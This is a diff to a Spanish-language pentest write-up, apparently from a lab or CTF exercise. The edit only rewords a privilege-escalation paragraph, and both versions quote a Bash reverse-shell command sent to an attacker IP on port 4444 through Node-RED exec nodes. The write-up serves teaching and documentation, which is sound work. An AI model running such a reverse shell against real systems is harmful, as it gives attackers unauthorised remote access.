@@ -131,7 +131,7 @@ dfinkelstein@tnightmarebc:~$ sudo /usr/local/bin/nodered-toggle start
 ## Escalada de privilegios
 
 ### Inyección mediante NODE-RED
-Gracias a NODE-RED, el comando que se puede ver en la imágen, funciona cuando se inyecta el comando `bash -c 'bash -i >& /dev/tcp/192.168.128.160/4444 0>&1'` porque el sistema ejecuta el input del usuario directamente en el sistema operativo mediante nodos como exec, sin una validación o sanitización adecuada, lo que permite que el string sea interpretado por Bash y se establezca la conexión inversa hacia el atacante.
+Gracias a NODE-RED, tal como se puede ver en la imágen, tenemos que el comando  `bash -c 'bash -i >& /dev/tcp/192.168.128.160/4444 0>&1'` funciona cuando se inyecta porque el sistema ejecuta el input del usuario directamente en el sistema operativo mediante nodos como exec, sin una validación o sanitización adecuada, lo que permite que el string sea interpretado por Bash y se establezca la conexión inversa hacia el atacante.
 Permitiendo ingresar al usuario dev, del cual no se posee la contraseña.
 
 ![](Evidencias_Visuales/inyección_NODE-RED)
